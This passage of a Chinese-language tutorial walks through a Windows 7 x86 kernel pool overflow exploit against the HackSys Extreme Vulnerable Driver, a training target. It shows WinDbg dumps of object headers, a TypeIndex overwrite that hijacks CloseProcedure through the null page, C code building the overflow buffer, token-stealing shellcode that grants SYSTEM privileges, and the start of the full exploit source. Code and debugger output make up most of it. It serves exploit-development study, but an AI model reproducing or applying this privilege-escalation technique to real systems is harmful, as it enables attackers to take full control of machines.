       +0x00d TraceFlags       : UChar
       +0x00e InfoMask         : UChar
       +0x00f Flags            : UChar
       +0x010 ObjectCreateInfo : Ptr32 _OBJECT_CREATE_INFORMATION
       +0x010 QuotaBlockCharged : Ptr32 Void
       +0x014 SecurityDescriptor : Ptr32 Void
       +0x018 Body
最后是对象体， 不同内核对象，对象体不同。
例如： DRIVER_OBJECT, DEVICE_OBJECT, FILE_OBJECT等
CreateEvent创建事件对象时，事件对象在内核中是存放在pool chunk中的， 结构为：
—————————
|PoolHeader |
————————–
|_OBJECT_HEADER_QUOTA_INFO|
—————————
|_OBJECT_HEADER |
—————————
|Body(对象体) |
—————————
这里我们关心的是_OBJECT_HEADER中的TypeIndex值，这个值是全局数组ObTypeIndexTable的索引。ObTypeIndexTable
存放有关各种“对象类型”的信息。
我们看下我们分配的chunk后面一个event结构信息，地址为85b10ac0，
其_OBJECT_HEADER数据为：
    kd> dt nt!_OBJECT_HEADER 85b10ac0+8+10 .
       +0x000 PointerCount     : 0n1
       +0x004 HandleCount      : 0n1
       +0x004 NextToFree       :
       +0x008 Lock             :
          +0x000 Locked           : 0y0
          +0x000 Waiting          : 0y0
          +0x000 Waking           : 0y0
          +0x000 MultipleShared   : 0y0
          +0x000 Shared           : 0y0000000000000000000000000000 (0)
          +0x000 Value            : 0
          +0x000 Ptr              : (null)
       +0x00c TypeIndex        : 0xc ''
       +0x00d TraceFlags       : 0 ''
       +0x00e InfoMask         : 0x8 ''
       +0x00f Flags            : 0 ''
       +0x010 ObjectCreateInfo :
       +0x010 QuotaBlockCharged :
       +0x014 SecurityDescriptor :
       +0x018 Body             :
          +0x000 UseThisFieldToCopy : 0n262145
          +0x000 DoNotUseThisField : 1.2951683872905357532e-318
可以看到该event对象OBJECT_HEADER的TypeIndex为0xc,其类型信息放在ObTypeIndexTable[0xc]中
    kd>  dd nt!ObTypeIndexTable
    82b8a900  00000000 bad0b0b0 8564e900 8564e838
    82b8a910  8564e770 8564e570 856ee040 856eef78
    82b8a920  856eeeb0 856eede8 856eed20 856ee6a0
    82b8a930  85763418 8571f878 856fb430 856fb368
    82b8a940  8570f430 8570f368 8575b448 8575b380
    82b8a950  8576b450 8576b388 857539c8 85753900
    82b8a960  85753838 856ef7a8 856ef6e0 856ef618
    82b8a970  856f39b8 856f34f0 856f3428 8573df78
可以看到，ObTypeIndexTable数组的第一项为0，没有使用，却为我们执行shellcode提供了机会。
第0xc项内容如下：
    kd> dt nt!_OBJECT_TYPE 85763418 .
       +0x000 TypeList         :  [ 0x85763418 - 0x85763418 ]
          +0x000 Flink            : 0x85763418 _LIST_ENTRY [ 0x85763418 - 0x85763418 ]
          +0x004 Blink            : 0x85763418 _LIST_ENTRY [ 0x85763418 - 0x85763418 ]
       +0x008 Name             :  "Event"
          +0x000 Length           : 0xa
          +0x002 MaximumLength    : 0xc
          +0x004 Buffer           : 0x8c605570  "Event"
       +0x010 DefaultObject    :
       +0x014 Index            : 0xc ''
       +0x018 TotalNumberOfObjects : 0x3c66
       +0x01c TotalNumberOfHandles : 0x3ca0
       +0x020 HighWaterNumberOfObjects : 0x4827
       +0x024 HighWaterNumberOfHandles : 0x487c
       +0x028 TypeInfo         :
          +0x000 Length           : 0x50
          +0x002 ObjectTypeFlags  : 0 ''
          +0x002 CaseInsensitive  : 0y0
          +0x002 UnnamedObjectsOnly : 0y0
          +0x002 UseDefaultObject : 0y0
          +0x002 SecurityRequired : 0y0
          +0x002 MaintainHandleCount : 0y0
          +0x002 MaintainTypeList : 0y0
          +0x002 SupportsObjectCallbacks : 0y0
          +0x004 ObjectTypeCode   : 2
          +0x008 InvalidAttributes : 0x100
          +0x00c GenericMapping   : _GENERIC_MAPPING
          +0x01c ValidAccessMask  : 0x1f0003
          +0x020 RetainAccess     : 0
          +0x024 PoolType         : 0 ( NonPagedPool )
          +0x028 DefaultPagedPoolCharge : 0
          +0x02c DefaultNonPagedPoolCharge : 0x40
          +0x030 DumpProcedure    : (null)
          +0x034 OpenProcedure    : (null)
          +0x038 CloseProcedure   : (null)
          +0x03c DeleteProcedure  : (null)
          +0x040 ParseProcedure   : (null)
          +0x044 SecurityProcedure : 0x82cac5b6        long  nt!SeDefaultObjectMethod+0
          +0x048 QueryNameProcedure : (null)
          +0x04c OkayToCloseProcedure : (null)
       +0x078 TypeLock         :
          +0x000 Locked           : 0y0
          +0x000 Waiting          : 0y0
          +0x000 Waking           : 0y0
          +0x000 MultipleShared   : 0y0
          +0x000 Shared           : 0y0000000000000000000000000000 (0)
          +0x000 Value            : 0
          +0x000 Ptr              : (null)
       +0x07c Key              : 0x6e657645
       +0x080 CallbackList     :  [ 0x85763498 - 0x85763498 ]
          +0x000 Flink            : 0x85763498 _LIST_ENTRY [ 0x85763498 - 0x85763498 ]
          +0x004 Blink            : 0x85763498 _LIST_ENTRY [ 0x85763498 - 0x85763498 ]
可知对象类型为Event，这里这个结构我们关心偏移0x28 TypeInfo这字段，其下有几个回调函数，这里我们使用偏移0x038
CloseProcedure,如果这个字段有值的话，当程序调用CloseProcedure函数时（即调用CloseHandle），就会执行该字段指向的代码。
如果我们覆盖Event chunk的_OBJECT_HEADER的TypeIndex值为0， 再将0x00000000 + (0x28+0x28) =
0x60,处的值，修改为我们的shellcode地址，当我们调用CloseHandle函数时，就能控制程序流程，执行我们的shellcode。
因为我们只覆盖TypeIndex的值，要保证其他值不变，我们看下poolheader到TypeIndex的值
    kd> dd 85b10ac0
    85b10ac0  04080040 ee657645 00000000 00000040
    85b10ad0  00000000 00000000 00000001 00000001
    85b10ae0  00000000 0008000c 87cc1640 00000000
需要0008000c覆盖为00080000。
构造数据如下：
        //构造数据，覆盖_OBJECT_HEADER偏移+0x00c的值覆盖为0，
        char junk_buffer[504] = { 0x41 };
        memset(junk_buffer, 0x41, 504);
        char overwritedata[41] =
            "\x40\x00\x08\x04"
            "\x45\x76\x65\xee"
            "\x00\x00\x00\x00"
            "\x40\x00\x00\x00"
            "\x00\x00\x00\x00"
            "\x00\x00\x00\x00"
            "\x01\x00\x00\x00"
            "\x01\x00\x00\x00"
            "\x00\x00\x00\x00"
            "\x00\x00\x08\x00";
        char UserModeBuffer[504 + 40 + 1] = {0};
        int UserModeBufferSize = 504 + 40;
        memcpy(UserModeBuffer, junk_buffer, 504);
        memcpy(UserModeBuffer + 504, overwritedata, 40);
然后我们申请一个起始地址为0的空间，将shellcode的地址写到0x60的位置
    *(PULONG)0x00000060 = (ULONG)pShellcodeBuf;
最后调用CloseHandle释放恶意构造的chunk。
        //这个spray_event1释放循环目前来看，好像不是必须的;
        for (int i = 0; i  dd 0
    00000000  00000000 00000000 00000000 00000000
    00000010  00000000 00000000 00000000 00000000
    00000020  00000000 00000000 00000000 00000000
    00000030  00000000 00000000 00000000 00000000
    00000040  00000000 00000000 00000000 00000000
    00000050  00000000 00000000 00000000 00000000
    00000060  000d0000 00000000 00000000 00000000
    00000070  00000000 00000000 00000000 00000000
0地址的0x60偏移处，是我们的shellcode地址。
    kd> uf 000d0000
    000d0000 90              nop
    000d0001 90              nop
    000d0002 90              nop
    000d0003 90              nop
    000d0004 60              pushad
    000d0005 64a124010000    mov     eax,dword ptr fs:[00000124h]
    000d000b 8b4050          mov     eax,dword ptr [eax+50h]
    000d000e 89c1            mov     ecx,eax
    000d0010 8b98f8000000    mov     ebx,dword ptr [eax+0F8h]
    000d0016 ba04000000      mov     edx,4
    000d001b 8b80b8000000    mov     eax,dword ptr [eax+0B8h]
    000d0021 2db8000000      sub     eax,0B8h
    000d0026 3990b4000000    cmp     dword ptr [eax+0B4h],edx
    000d002c 75ed            jne     000d001b  Branch
    000d002e 8b90f8000000    mov     edx,dword ptr [eax+0F8h]
    000d0034 8991f8000000    mov     dword ptr [ecx+0F8h],edx
    000d003a 61              popad
    000d003b c21000          ret     10h
Shellcode的目的就是把当前进程的token值替换为system的token，
后面这个ret 10h， ret后面的值要根据实际情况稍作判断。
贴张运行成功的截图
## 总结
本文并没有涉及太多内核池的结构，管理相关信息，如果想做更深入的研究，这些是必不可少的知识，务必相当熟悉。还有学习时，不要只看，认为自己看懂了就行了，一定要多调试、跟踪。
## 参考
Window内核利用教程4池风水 -> 池溢出
Windows exploit开发系列教程第十六部分：内核利用程序之池溢出
Windows kernel pool 初探
## 附：利用代码：
    #include 
    #include 
    #define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
    #define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
    // Windows 7 SP1 x86 Offsets
    #define KTHREAD_OFFSET     0x124  // nt!_KPCR.PcrbData.CurrentThread
    #define EPROCESS_OFFSET    0x050  // nt!_KTHREAD.ApcState.Process
    #define PID_OFFSET         0x0B4  // nt!_EPROCESS.UniqueProcessId
    #define FLINK_OFFSET       0x0B8  // nt!_EPROCESS.ActiveProcessLinks.Flink
    #define TOKEN_OFFSET       0x0F8  // nt!_EPROCESS.Token
    #define SYSTEM_PID         0x004  // SYSTEM Process PID
    #define DEVICE_NAME "\\\\.\\HackSysExtremeVulnerableDriver"
    #define HACKSYS_EVD_IOCTL_POOL_OVERFLOW                   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_NEITHER, FILE_ANY_ACCESS)
    typedef NTSTATUS(WINAPI *NtAllocateVirtualMemory_t)(IN HANDLE     ProcessHandle,
        IN OUT PVOID  *BaseAddress,
        IN ULONG      ZeroBits,
        IN OUT PULONG AllocationSize,
        IN ULONG      AllocationType,
        IN ULONG      Protect);
    NtAllocateVirtualMemory_t     NtAllocateVirtualMemory;